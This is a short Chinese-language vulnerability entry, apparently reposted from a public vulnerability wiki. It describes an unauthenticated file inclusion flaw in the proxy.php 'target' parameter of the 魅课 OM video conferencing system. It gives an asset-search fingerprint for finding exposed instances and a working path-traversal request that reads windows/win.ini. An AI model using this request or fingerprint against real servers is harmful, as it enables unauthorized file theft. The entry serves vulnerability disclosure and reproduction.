---
title: "魅课 OM视频会议系统 proxy.php 文件包含漏洞"
date: 2026-10-16 09:11:54
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "魅课-OM视频会议系统"
tags:
  - "魅课-OM视频会议系统"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件。

## 漏洞影响

```
魅课OM视频会议系统
```

## 网络测绘

```
app="OMEETING-OM视频会议"
```

## 漏洞复现

登录页面

![image-20220525153028849](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251530024.png)

验证POC

```
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```

![image-20220525153105283](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251531338.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%AD%85%E8%AF%BE-OM%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md)
